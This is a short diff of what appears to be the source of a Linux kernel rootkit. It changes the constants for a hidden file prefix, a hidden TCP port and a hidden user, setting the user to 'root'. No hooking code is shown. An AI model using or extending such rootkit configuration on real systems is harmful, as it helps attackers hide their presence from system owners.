@@ -4,9 +4,9 @@
 #include <linux/dirent.h>	        //contains dirent structs etc
 #include <linux/tcp.h>
 
-#define PREFIX "SOHAIL"
-#define PORT 420
-#define USER "sohail"
+#define PREFIX "KK"
+#define PORT 42069
+#define USER "root"
 
 #ifdef CONFIG_X86_64
 /* on 64-bit x86 and kernel v4.17 syscalls are nolonger
